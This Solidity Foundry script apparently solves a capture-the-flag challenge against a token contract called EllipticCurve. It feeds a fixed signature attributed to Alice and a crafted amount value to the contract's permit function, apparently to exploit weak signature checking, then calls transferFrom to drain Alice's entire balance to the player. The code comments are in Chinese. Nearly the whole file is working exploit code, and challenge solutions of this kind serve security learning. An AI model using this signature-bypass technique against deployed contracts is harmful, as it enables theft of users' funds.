// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IEllipticCurve {
    function permit(uint256 amount, address spender, bytes calldata tokenOwnerSignature, bytes calldata spenderSignature) external;
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function usedHashes(bytes32) external view returns (bool);
}

contract SolveScript is Script {
    function run() external {
        uint256 playerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(playerPrivateKey);
        
        IEllipticCurve etk = IEllipticCurve(vm.envAddress("INSTANCE_ADDRESS"));

        vm.startBroadcast(playerPrivateKey);

        // Alice 的簽名 (從 ecrecover 驗證的參數組合)
        bytes memory aliceSig = abi.encodePacked(
            bytes32(0xab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f), // r
            bytes32(0x2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de12), // s
            uint8(28) // v
        );


        // amount 值
        uint256 amount = 0x87f1c8cd4c0e19511304b612a9b4996f8c2bd795796636bd25812cd5b0b6a973;
        
        
        // require(etk.usedHashes(bytes32(amount)) == false, "Amount hash already used");

        // 生成 spender 簽名
        bytes32 spenderHash = keccak256(abi.encodePacked(
            address(0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e), // alice
            player,
            amount
        ));
        
        (uint8 sv, bytes32 sr, bytes32 ss) = vm.sign(playerPrivateKey, spenderHash);

        // 呼叫 permit
        console.log("etk.usedHashes(bytes32(amount)) before permit:", etk.usedHashes(bytes32(amount)));
        etk.permit(amount, player, aliceSig, abi.encodePacked(sr, ss, sv));
        console.log("etk.usedHashes(bytes32(amount)) after permit:", etk.usedHashes(bytes32(amount)));

        // Print Alice's balance before transfer
        console.log("player balance before:", etk.balanceOf(player));
        // 轉帳
        etk.transferFrom(
            0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e, // alice
            player,
            etk.balanceOf(0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e)
        );

        // Print player's token balance
        console.log("Player balance after:", etk.balanceOf(player));

        vm.stopBroadcast();
    }
}
